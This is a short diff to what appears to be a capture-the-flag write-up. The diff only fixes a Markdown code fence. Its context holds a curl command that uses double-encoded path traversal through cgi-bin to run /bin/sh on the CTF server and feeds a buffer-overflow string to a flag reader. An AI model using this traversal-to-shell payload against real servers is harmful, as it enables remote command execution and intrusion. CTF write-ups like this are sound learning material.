@@ -46,7 +46,7 @@ int main(void) {
 }
 ```
 Buffer overflow Overwrite uid variable
-````bash
+```bash
 curl 'http://ctf-metared-2021.ua.pt:24202/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0" | ./read_flag'
 
 
